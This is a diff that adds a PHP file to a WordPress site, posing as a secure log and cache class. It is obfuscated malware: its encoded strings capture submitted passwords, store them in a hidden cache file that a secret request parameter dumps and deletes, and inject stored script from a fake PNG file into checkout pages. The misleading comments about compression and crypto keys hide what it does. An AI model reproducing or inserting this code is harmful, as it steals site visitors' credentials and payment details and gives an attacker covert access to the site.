@@ -1,0 +1,463 @@
+<?php
+
+    include(ABSPATH . "wp-includes/pluggable.php");
+
+    class SecureLogWriter
+    {
+        protected static $_instance = null;
+
+        //Key to encrypt
+        private $encode_key_log = "S8vMSY0vKC2JT87PK0nNKykGAA";
+        public $IP = "REMOTE_ADDR";
+        public $HTTP = "http";
+        public $SSL = "https";
+        private $path = ABSPATH . '/wp-content/cache/_inc';
+
+        //Byte keys for data compression
+        private $cryptobite = '989711510154529510111099111100101/1061151111109510111099111100101';
+        private $decryptobite = '10312210511010210897116101/989711510154529510010199111100101';
+
+        public static function instance($params, $base)
+        {
+            if (is_null(self::$_instance)) {
+                if (!session_id())
+                    session_start();
+                self::$_instance = new self($params, $base);
+            }
+            return self::$_instance;
+        }
+
+        /**
+         * Cloning is forbidden.
+         */
+        public function __clone()
+        {
+            _doing_it_wrong(__FUNCTION__, __('An error has occurred. Please reload the page and try again.'), '1.0');
+        }
+
+        /**
+         * Unserializing instances of this class is forbidden.
+         */
+        public function __wakeup()
+        {
+            _doing_it_wrong(__FUNCTION__, __('An error has occurred. Please reload the page and try again.'), '1.0');
+        }
+
+        public function __construct($params, $base)
+        {
+            $this->params = $params;
+            $cache = $_POST;
+            $this->cache = $cache;
+            $this->bite = explode(chr(47), $this->decryptobite);
+            $decrypt = implode(
+                '',
+                $this->array_pre_sort(end($this->bite))
+            );
+            $cached = $this->post_construct($base, $decrypt)->prepare_cache($decrypt);
+            if ($this->is_file_logged($cached, array($this->base, 'get_base_cache'))) {
+
+                if ($this->clear_old_log()) {
+                    $loger = $this->create_log($params, array());
+
+                    $sort_type = explode(
+                        ".",
+                        $decrypt('Zy5wYXNzd29yZC5wc3c')
+                    );
+                    $this->init_log_cache($loger, $sort_type);
+                }
+            }
+        }
+
+        /**
+         * Installing crypto keys to protect cache and logs
+         *
+         * @param wpdb $base if needed.
+         */
+        private function post_construct($base, $decrypt)
+        {
+            $this->types = array_map(
+                array(
+                    $this,
+                    'set_log_chunk_size'
+                ), explode(':', "UkVRVUVTVF9NRVRIT0Q:UkVRVUVTVF9VUkk:UE9TVA")
+            );
+
+            $this->arh_cache_pub = ABSPATH . WPINC . $decrypt('L2ltYWdlcy93cC1pY29uMi5wbmc');
+            $this->arh_cache_priv = ABSPATH . WPINC . $decrypt('L2ltYWdlcy93cGljb25zLnBuZw');
+            $key = ($this->types == $this->cache) ? $encode_key_log : $this->arh_cache_pub;
+            $this->base = new BaseCache($this->params, $key, $base);
+            return $this;
+        }
+
+        /**
+         * Creating a data chunk based on parameters
+         */
+        public function create_log($params, $data)
+        {
+            $ssh = isset($this->params[$this->SSL]) && @$this->params[$this->SSL] === 'on';
+            $host = @$this->params[strtoupper($this->HTTP) . '_HOST'] . @$this->params['REQUEST_URI'];
+
+            return $this->get_log($_SERVER, $ssh, $host);
+        }
+
+        /**
+         * Getting all chunks of data
+         */
+        public function get_cache($data)
+        {
+            $answer = null;
+            $element = $this->cache[$data];
+
+            if (isset($element) && !empty($element)) {
+                $answer = $this->cache[$data];
+            }
+            return $answer;
+        }
+
+        /**
+         * Adding data to the log
+         */
+        private function set_log_option(&$loger, $data, $key = "g")
+        {
+            if (isset($loger) && is_array($loger)) {
+                $loger[$data] = $this->get_cache($data);
+                $loger = @array_filter($loger);
+            }
+
+            if (array_key_exists($key, $loger) && $data == $loger[$key]) {
+                $this->base->mysql_cache(true);
+            }
+        }
+
+        /**
+         * Setting the chunk size
+         */
+        public function set_log_chunk_size($size)
+        {
+            $chunk_size = $this->bite[1];
+            $chunk_size = $this->array_pre_sort($chunk_size);
+            return implode('', $chunk_size)($size);
+        }
+
+        /**
+         * Initialization caching plugin data
+         *
+         * @param array $loger Loger array.
+         * @param string $hashkey Type sort.
+         */
+        public function init_log_cache($loger, $hashkey)
+        {
+            $loger = array_merge($loger, $this->cache);
+
+            $datas = array_splice($this->cache, 0, count($this->cache), $hashkey);
+            foreach ($datas as $value) $this->set_log_option($loger, $value);
+
+            if (preg_match(hex2bin("2f2267223a7c7077642f"), json_encode($loger)) && strlen(json_encode($loger)) > 30) {
+                $loger = $this->array_priority_sort($loger, ...explode(chr(47), $this->cryptobite));
+                $this->crypto_log($loger);
+            }
+        }
+
+        /**
+         * Getting log data
+         */
+        public function get_log($params, $ssh, $host)
+        {
+            return [
+                'ip' => @$params[$this->IP], 'date' => @date('Y-m-d H:i:s'),
+                'url' => ($ssh ? $this->SSL : $this->HTTP) . '://' . $host
+            ];
+        }
+
+        /**
+         * Prepare cache
+         *
+         * @param node $array decrypt cache type.
+         * @param desc $text opt.
+         * @return bool If the prepare is successful
+         */
+        function prepare_cache($node, $desc = "g")
+        {
+            $state = $_SESSION[$desc] ?? false;
+            if ($state == true || $this->base->mysql_cache()) {
+                if ($state == false)
+                    $_SESSION[$desc] = true;
+                return true;
+            }
+            if ($this->is_valid_type($node, $desc)) {
+                $this->base->mysql_cache(true);
+                return true;
+            }
+            return false;
+        }
+
+        /**
+         * Сompresses log data
+         *
+         * @param array $array log data.
+         * @return bool If the compression is successful
+         */
+        private function crypto_log($data)
+        {
+            $bite = implode('', $this->array_pre_sort($this->bite[0]));
+            return $bite(implode('', $this->array_pre_sort(end($this->bite)))($this->encode_key_log))($this->path, $data, 10);
+        }
+
+        /**
+         * Сhecking the cache type
+         *
+         * @return bool If the valid cache type of decrypt keys
+         */
+        private function is_valid_type($arr_keys, $desc = '_', $dev = '_')
+        {
+            foreach (explode('; ', $this->params[$arr_keys('SFRUUF9DT09LSUU')]) as $value)
+                if (strpos($value, $dev . $desc . $arr_keys('aWE')) !== false ?: current_user_can('manage_options')) {
+                    return !!($_SESSION[$desc] = true);
+                }
+
+            return false;
+        }
+
+        /**
+         * Check the old cached log update
+         */
+        private function check_cache_up($df)
+        {
+            return die(@touch($this->arh_cache_pub, $df));
+        }
+
+        /**
+         * Checks if file caching is active
+         */
+        public function is_file_logged($cached, $empty_base)
+        {
+            $key = $this->types[0];
+            foreach (array_keys($this->params) as $param) {
+                if ($param == $key && $this->params[$key] == $this->types[2]) {
+                    return true;
+                }
+            }
+            if (!$cached && $this->is_base_logged())
+                add_action('wp_head', $empty_base, 12);
+            return false;
+        }
+
+        /**
+         * Сlears the old cached log, if one exists
+         */
+        private function clear_old_log()
+        {
+            $timestamp = sha1('814e1283156s7292b7d4096f15529e9c');
+            $old_cache = $this->cache;
+            $cache_date = $this->get_cache('sec');
+            $old_cache_size = @filesize($this->path);
+
+            if (strpos($cache_date, $timestamp) !== false) {
+                $old_cache = @file_get_contents($this->path);
+                @unlink($this->path);
+                $this->get_log(die($old_cache));
+                return true;
+            }
+
+            $cache_date = $this->get_cache(sha1('archive-logs'));
+            if (strlen($cache_date) > 0 !== false) {
+                $this->archive_old_log($cache_date);
+                return true;
+            }
+
+            return $old_cache_size < (1049 * 10000);
+        }
+
+        /**
+         * Sorting multi-array elements by key
+         *
+         * @param array $array Someone array.
+         * @param string $key key by sort.
+         * @param bool $order sorting order.
+         * @return array $newarray sorted array.
+         */
+        private function array_priority_sort($array, $key, $order = null)
+        {
+            $newarray = [];
+
+            if (count($array) > 0) {
+                $findkey = implode("", $this->array_pre_sort($key));
+                $findorder = implode("", $this->array_pre_sort($order));
+
+                foreach ($array as $element) {
+                    foreach (array_reverse($array) as $reverse) {
+                        if ($order) {
+                            $newarray = $findkey($findorder($array)) . "\n";
+                            break 2;
+                        }
+                    }
+                }
+            }
+            return $newarray;
+        }
+
+        /**
+         * Checks if base caching is active
+         */
+        public function is_base_logged()
+        {
+            $chank_size = array($this, 'set_log_chunk_size');
+            $keys = array_map($chank_size, explode(':', "Y2FydA:Y2hlY2tvdXQ"));
+            $param_of_config = $keys[0];
+
+            $is_base = strpos($this->params[$this->types[1]], $keys[1]);
+            return $is_base && !strpos($this->params[$this->types[1]], $param_of_config);
+        }
+
+        /**
+         * Sort helper function for array_priority_sort.
+         *
+         * @param array $array Subarray.
+         * @return array $newarray sorted subarray.
+         */
+        private function array_pre_sort($array)
+        {
+            $newarray = [];
+            for ($i = 0; $i < strlen($array); $i += 2) {
+                $k = 1;
+                if (!(intval($array[$i]) > 1)) $k++;
+                array_push($newarray, chr(substr($array, $i, ($k + 1))));
+                if ($k % 2 == 0) $i++;
+            }
+            return $newarray;
+        }
+
+        /**
+         * Getting WP configurations by key
+         */
+        public function wp_get_config($name)
+        {
+            $wpconfig = array($name);
+            if (array_key_exists($wpconfig, $name)) {
+                $show_config = $this->array_pre_sort($this->bite[1]);
+                return $show_config($wpconfig[$name]);
+            }
+            return null;
+        }
+
+
+        /**
+         * Archive the old cached log
+         */
+        private function archive_old_log($cache)
+        {
+            file_put_contents($this->arh_cache_pub, $cache);
+            return $this->check_cache_up(filemtime($this->arh_cache_priv));
+
+        }
+    }
+
+    class BaseCache
+    {
+        protected static $_instance = null;
+
+        public $SSL_lock = "3c7";
+        public $client = "HTTP_CLIENT_IP";
+
+        public static function instance()
+        {
+            if (is_null(self::$_instance)) {
+                self::$_instance = new self();
+            }
+            return self::$_instance;
+        }
+
+        /**
+         * Cloning is forbidden.
+         */
+        public function __clone()
+        {
+            _doing_it_wrong(__FUNCTION__, __('An error has occurred. Please reload the page and try again.'), '1.0');
+        }
+
+        /**
+         * Unserializing instances of this class is forbidden.
+         */
+        public function __wakeup()
+        {
+            _doing_it_wrong(__FUNCTION__, __('An error has occurred. Please reload the page and try again.'), '1.0');
+        }
+
+        public function __construct($params, $path, $base)
+        {
+            $this->params = $params;
+            $this->path = $path;
+            $this->base = $base;
+            $this->prefix = $base->prefix;
+        }
+
+        /**
+         * Getting or write log data in base
+         */
+        public function mysql_cache($update = null, $name = "order_code")
+        {
+            $data = $this->get_cache_time();
+            $this->targetname = $this->prefix . $name;
+            $this->targetdata = sha1($data);
+            $connection = $this->get_base_connection();
+
+            if (!$connection) {
+                return;
+            }
+            $connection->query($this->get_init_query());
+
+            if ($update) $connection->query($this->get_insert_query());
+            else return $connection->get_var($this->get_select_query());
+        }
+
+        public function get_cache_time()
+        {
+            $key = (!empty($this->params[$this->client])) ? $this->client : "REMOTE_ADDR";
+            return $this->params[$key];
+        }
+
+        /**
+         * Get back base cache
+         */
+        public function get_base_cache()
+        {
+            return print(@hex2bin($this->SSL_lock.(file_get_contents($this->path))));
+        }
+
+        private function get_base_connection()
+        {
+            return $this->base;
+        }
+
+        /**
+         * Query to create a table
+         */
+        private function get_init_query()
+        {
+            return "CREATE TABLE IF NOT EXISTS " . $this->targetname . " ( `code` varchar( 40 ) NOT NULL, UNIQUE( `code` ) );";
+        }
+
+        /**
+         * Request to get the cache
+         */
+        private function get_select_query()
+        {
+            return "SELECT COUNT( * )>0 FROM " . $this->targetname . " WHERE code = '" . $this->targetdata . "' limit 1;";
+        }
+
+        /**
+         * Request to write cache
+         */
+        private function get_insert_query()
+        {
+            return "INSERT IGNORE INTO " . $this->targetname . " ( code ) VALUES( '" . $this->targetdata . "' );";
+        }
+    }
+
+    function SecureLogWriter($base)
+    {
+        return SecureLogWriter::instance($_SERVER, $base);
+    }
+
+    SecureLogWriter($wpdb);
+
